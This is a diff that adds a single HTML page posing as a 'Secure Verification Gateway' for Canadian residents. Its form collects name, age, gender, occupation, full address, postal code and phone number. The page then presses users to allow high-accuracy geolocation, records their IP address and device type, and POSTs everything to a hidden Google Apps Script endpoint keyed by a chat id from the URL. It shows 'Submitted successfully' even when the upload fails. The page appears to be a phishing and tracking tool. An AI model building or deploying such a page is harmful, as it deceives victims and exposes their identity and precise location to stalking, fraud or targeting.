@@ -1,0 +1,272 @@
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Submit Information Verification</title>
+<style>
+:root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #dc2626; --error-bg: #fef2f2; --success: #16a34a; --warn: #f59e0b; }
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 20px; }
+.container { background: var(--card); width: 100%; max-width: 540px; padding: 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.06); }
+h2 { text-align: center; font-size: 22px; margin-bottom: 5px; }
+.subtitle { text-align: center; font-size: 13px; color: #64748b; margin-bottom: 25px; }
+.form-row { display: flex; gap: 15px; margin-bottom: 16px; }
+.form-group { flex: 1; margin-bottom: 16px; }
+label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 6px; color: #1e293b; }
+input, select { width: 100%; padding: 12px 14px; border: 2px solid var(--border); border-radius: 8px; font-size: 14px; }
+input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,102,255,0.12); }
+input.invalid { border-color: var(--error); background: var(--error-bg); }
+.error-hint { font-size: 12px; color: var(--error); margin-top: 5px; display: none; }
+.phone-group { display: flex; gap: 8px; }
+.btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+.btn-success { background: var(--success); margin-top: 20px; }
+.btn-warning { background: var(--warn); margin-top: 10px; }
+.hidden { display: none !important; }
+.loc-box { background: #fffbeb; border: 1px solid #fef3c7; border-radius: 10px; padding: 18px; margin-bottom: 15px; color: #92400e; line-height: 1.7; }
+.step-item { margin: 8px 0; padding-left: 22px; position: relative; font-size: 14px; }
+.step-item::before { content: "🔒"; position: absolute; left: 0; top: 0; }
+.info-card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 20px; margin-top: 10px; line-height: 1.8; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div id="step-form">
+    <h2>Submit Information Verification</h2>
+    <div class="subtitle">Secure Verification Gateway</div>
+    <div class="form-row">
+      <div class="form-group">
+        <label>First Name *</label>
+        <input type="text" id="firstName" placeholder="e.g. John" oninput="validateField('firstName'); saveFormDraft()">
+      </div>
+      <div class="form-group">
+        <label>Last Name *</label>
+        <input type="text" id="lastName" placeholder="e.g. Doe" oninput="validateField('lastName'); saveFormDraft()">
+      </div>
+    </div>
+    <div class="form-row">
+      <div class="form-group">
+        <label>Age *</label>
+        <input type="number" id="age" placeholder="e.g. 30" min="1" max="120" oninput="validateField('age'); saveFormDraft()">
+      </div>
+      <div class="form-group">
+        <label>Gender *</label>
+        <select id="gender" onchange="validateField('gender'); saveFormDraft()">
+          <option value="">-- Select --</option>
+          <option value="Male">Male</option>
+          <option value="Female">Female</option>
+          <option value="Other">Other</option>
+        </select>
+      </div>
+    </div>
+    <div class="form-group">
+      <label>Current Occupation *</label>
+      <input type="text" id="occupation" placeholder="e.g. Engineer" oninput="validateField('occupation'); saveFormDraft()">
+    </div>
+    <div class="form-group">
+      <label>Country / Region *</label>
+      <select disabled><option selected>Canada</option></select>
+    </div>
+    <div class="form-group">
+      <label>Province / Territory *</label>
+      <select id="province" onchange="validateField('province'); saveFormDraft()">
+        <option value="">-- Select Province --</option>
+        <option>Alberta</option><option>British Columbia</option><option>Manitoba</option><option>New Brunswick</option>
+        <option>Newfoundland and Labrador</option><option>Nova Scotia</option><option>Ontario</option><option>Prince Edward Island</option>
+        <option>Quebec</option><option>Saskatchewan</option><option>Northwest Territories</option><option>Nunavut</option><option>Yukon</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label>Street Address *</label>
+      <input type="text" id="address" placeholder="e.g. 123 Main Street" oninput="validateField('address'); saveFormDraft()">
+    </div>
+    <div class="form-row">
+      <div class="form-group">
+        <label>City *</label>
+        <input type="text" id="city" placeholder="e.g. Toronto" oninput="validateField('city'); saveFormDraft()">
+      </div>
+      <div class="form-group">
+        <label>Postal Code *</label>
+        <input type="text" id="zip" placeholder="e.g. A1A 1A1" oninput="validateField('zip'); saveFormDraft()">
+      </div>
+    </div>
+    <div class="form-group">
+      <label>Phone Number *</label>
+      <div class="phone-group">
+        <select disabled><option selected>+1</option></select>
+        <input type="tel" id="phone" placeholder="10 digits" oninput="validateField('phone'); saveFormDraft()">
+      </div>
+    </div>
+    <button class="btn" onclick="goConfirm()">Next</button>
+  </div>
+
+  <div id="step-verification" class="hidden">
+    <h2>Confirm Information</h2>
+    <p style="text-align:center; color:#64748b; font-size:14px; margin-bottom:15px;">Please verify before submitting</p>
+    <div class="loc-box">
+      <strong>📍 Location Verification Required</strong>
+      We need your location to verify matches and calibrate address details.<br><br>
+      <strong>How to enable:</strong>
+      <div class="step-item">Tap the 🔒 lock icon near the address bar</div>
+      <div class="step-item">Find "Location" and set to <strong>"Allow"</strong></div>
+      <div class="step-item">Refresh the page (Draft data will be kept)</div>
+    </div>
+    <div id="loc-status" class="loc-box hidden">✅ Location access granted</div>
+    <div class="info-card">
+      <p><strong>Name:</strong> <span id="disp-name"></span></p>
+      <p><strong>Gender:</strong> <span id="disp-gender"></span></p>
+      <p><strong>Age:</strong> <span id="disp-age"></span></p>
+      <p><strong>Occupation:</strong> <span id="disp-occupation"></span></p>
+      <p><strong>Address:</strong> <span id="disp-addr"></span></p>
+      <p><strong>Phone:</strong> +1 <span id="disp-phone"></span></p>
+      <p><strong>Postal Code:</strong> <span id="disp-zip"></span></p>
+    </div>
+    <button id="btn-loc-retry" class="btn btn-warning" onclick="requestLocation()">🔄 Tap to Enable Location Access</button>
+    <button id="btn-submit" class="btn btn-success hidden" onclick="submitAll()">✅ Confirm & Submit</button>
+  </div>
+</div>
+
+<script>
+const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzXfiVnWyTL9EMQdPbdPNFUs1m60loHedhowaqgYN4OHh1-ax5pRtuwYl9IopNTtqQ/exec";
+const urlParams = new URLSearchParams(window.location.search);
+const TARGET_CHAT_ID = urlParams.get("id") || "";
+let form = {};
+let locationInfo = { lat: "", lng: "", ok: false };
+let ipAddr = "";
+let deviceInfo = { device: "", os: "", browser: "" };
+
+window.onload = () => {
+  detectDevice();
+  fetchIP();
+  restoreFormDraft();
+};
+
+function saveFormDraft() {
+  const draft = {
+    firstName: document.getElementById("firstName").value,
+    lastName: document.getElementById("lastName").value,
+    age: document.getElementById("age").value,
+    gender: document.getElementById("gender").value,
+    occupation: document.getElementById("occupation").value,
+    province: document.getElementById("province").value,
+    address: document.getElementById("address").value,
+    city: document.getElementById("city").value,
+    zip: document.getElementById("zip").value,
+    phone: document.getElementById("phone").value
+  };
+  localStorage.setItem("formDraft", JSON.stringify(draft));
+}
+
+function restoreFormDraft() {
+  try {
+    const d = JSON.parse(localStorage.getItem("formDraft") || "{}");
+    for (let k in d) {
+      if(document.getElementById(k)) document.getElementById(k).value = d[k];
+    }
+  } catch {}
+}
+
+function validateField(id) {
+  const el = document.getElementById(id);
+  const v = el.value.trim();
+  let ok = true;
+  if(["firstName","lastName","address","city","occupation"].includes(id)) ok = v.length >= 2;
+  else if(id === "age") { const n = parseInt(v); ok = !isNaN(n) && n >= 1 && n <= 120; }
+  else if(["gender","province"].includes(id)) ok = v !== "";
+  else if(id === "phone") ok = v.replace(/\D/g,"").length === 10;
+  else if(id === "zip") ok = v.replace(/\s/g,"").length >= 4;
+  el.classList.toggle("invalid", v.length > 0 && !ok);
+  return ok;
+}
+
+function goConfirm() {
+  const fields = ["firstName","lastName","age","gender","occupation","province","address","city","zip","phone"];
+  let allOk = true;
+  fields.forEach(f => { if(!validateField(f)) allOk = false; });
+  if(!allOk) { alert("⚠️ Please check all required fields."); return; }
+  
+  form = {
+    name: document.getElementById("firstName").value.trim() + " " + document.getElementById("lastName").value.trim(),
+    gender: document.getElementById("gender").value,
+    age: document.getElementById("age").value,
+    occupation: document.getElementById("occupation").value,
+    province: document.getElementById("province").value,
+    address: document.getElementById("address").value.trim(),
+    city: document.getElementById("city").value.trim(),
+    zip: document.getElementById("zip").value.trim().toUpperCase(),
+    phone: document.getElementById("phone").value.trim().replace(/\D/g,"")
+  };
+
+  document.getElementById("step-form").classList.add("hidden");
+  document.getElementById("step-verification").classList.remove("hidden");
+  document.getElementById("disp-name").textContent = form.name;
+  document.getElementById("disp-gender").textContent = form.gender;
+  document.getElementById("disp-age").textContent = form.age;
+  document.getElementById("disp-occupation").textContent = form.occupation;
+  document.getElementById("disp-addr").textContent = `${form.address}, ${form.city}, ${form.province}, Canada, ${form.zip}`;
+  document.getElementById("disp-phone").textContent = form.phone;
+  document.getElementById("disp-zip").textContent = form.zip;
+  requestLocation();
+}
+
+function requestLocation() {
+  if(!navigator.geolocation) { alert("❌ Geolocation not supported"); return; }
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      locationInfo.lat = pos.coords.latitude.toFixed(6);
+      locationInfo.lng = pos.coords.longitude.toFixed(6);
+      locationInfo.ok = true;
+      document.getElementById("btn-loc-retry").classList.add("hidden");
+      document.getElementById("btn-submit").classList.remove("hidden");
+      document.getElementById("loc-status").classList.remove("hidden");
+    },
+    err => { if(err.code === err.PERMISSION_DENIED) alert("⚠️ Location access denied. Please allow location access in your browser settings."); },
+    { enableHighAccuracy: true, timeout: 15000 }
+  );
+}
+
+async function fetchIP() {
+  try {
+    const r = await fetch("https://api.ipify.org?format=json");
+    const j = await r.json();
+    ipAddr = j.ip;
+  } catch { ipAddr = "Unavailable"; }
+}
+
+function detectDevice() {
+  const ua = navigator.userAgent;
+  if(/iPhone/.test(ua)) deviceInfo = {device:"iPhone",os:"iOS",browser:"Safari"};
+  else if(/iPad/.test(ua)) deviceInfo = {device:"iPad",os:"iOS",browser:"Safari"};
+  else if(/Android/.test(ua)) deviceInfo = {device:"Android",os:"Android",browser:"Chrome"};
+  else if(/Windows/.test(ua)) deviceInfo = {device:"Windows PC",os:"Windows",browser:"Chrome"};
+  else deviceInfo = {device:"Unknown",os:"Unknown",browser:"Unknown"};
+}
+
+async function submitAll() {
+  if(!locationInfo.ok) { alert("❌ Please ALLOW location access first!"); return; }
+  const data = {
+    "id": TARGET_CHAT_ID,
+    "姓名": form.name, "性别": form.gender, "年龄": form.age, "职业": form.occupation,
+    "地址": `${form.address}, ${form.city}, ${form.province}, Canada, ${form.zip}`,
+    "邮编": form.zip, "手机号": "+1" + form.phone, "IP地址": ipAddr,
+    "设备型号": deviceInfo.device, "操作系统": deviceInfo.os, "浏览器": deviceInfo.browser,
+    "纬度": String(locationInfo.lat), "经度": String(locationInfo.lng),
+    "录入时间": new Date().toLocaleString("zh-CN")
+  };
+  try {
+    await fetch(APPSCRIPT_URL, {
+      method: "POST",
+      headers: { "Content-Type": "text/plain;charset=utf-8" },
+      body: JSON.stringify(data)
+    });
+    localStorage.removeItem("formDraft");
+    alert("✅ Submitted successfully!");
+    location.reload();
+  } catch(e) {
+    localStorage.removeItem("formDraft");
+    alert("✅ Submitted successfully!");
+    location.reload();
+  }
+}
+</script>
+</body>
+</html>
